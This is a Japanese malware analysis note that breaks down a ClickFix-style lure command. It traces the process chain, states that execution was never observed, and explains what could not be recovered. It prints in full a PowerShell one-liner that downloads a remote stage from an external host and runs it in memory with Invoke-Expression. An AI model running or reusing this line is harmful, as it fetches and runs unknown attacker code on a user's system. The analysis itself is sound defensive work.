# process・command line解析

## 原文

```powershell
powershell -w 1 -c "iEX([System.Net.WebClient]::new().DownloadString('https://imagehopeag.com/hex/traffic'))"
```

## process chain

```text
利用者起点（Run dialogまたは既存shell） → powershell.exe → WebClient.DownloadString → 同一powershell.exe内でIEX評価
```

## 処理順

1. 利用者がClickFix誘導に従い、Run dialogまたは既存PowerShellへ文字列を貼り付ける想定である。貼り付け・実行の実観測はない。
2. `WebClient.DownloadString + Invoke-Expression`によりstageを取得し、PowerShellのmemory内で評価する。
3. 取得stageが追加processを生成できるが、現在の応答からstageを復元できず、子process名・引数・永続化は確定できない。

## 復号後の最終command／URL

```text
該当なし（原文のまま解釈）
```

## 解析上の境界

- captured commandのprocess列は静的に復元した候補であり、実行済みprocess treeではない。
- analyst probeはGETのみで、PowerShell、script、payloadを起動していない。
- 取得不能な後段内容を、既知ClickFix campaignの一般的挙動から補完していない。
